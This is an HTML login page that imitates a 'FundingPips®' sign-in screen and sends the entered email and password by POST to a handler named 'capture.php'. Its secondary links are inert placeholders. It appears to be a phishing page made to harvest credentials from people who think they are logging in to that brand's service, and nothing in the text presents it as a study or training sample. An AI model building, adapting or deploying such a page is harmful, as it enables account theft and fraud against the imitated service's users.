<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <div class="logo">
        <h1>FundingPips®</h1>
      </div>
      <h2>Sign in to your account</h2>
      <form action="capture.php" method="POST" class="login-form">
        <label for="email">Your email</label>
        <input type="email" id="email" name="email" placeholder="name@company.com" required>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="●●●●●●●●" required>

        <div class="options">
          <label>
            <input type="checkbox" name="remember"> Remember me
          </label>
          <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <button type="submit" class="btn primary-btn">Sign in</button>
        <button type="button" class="btn secondary-btn">Create Account</button>
      </form>
      <a href="#" class="privacy-policy">Privacy policy</a>
    </div>
  </div>
</body>
</html>


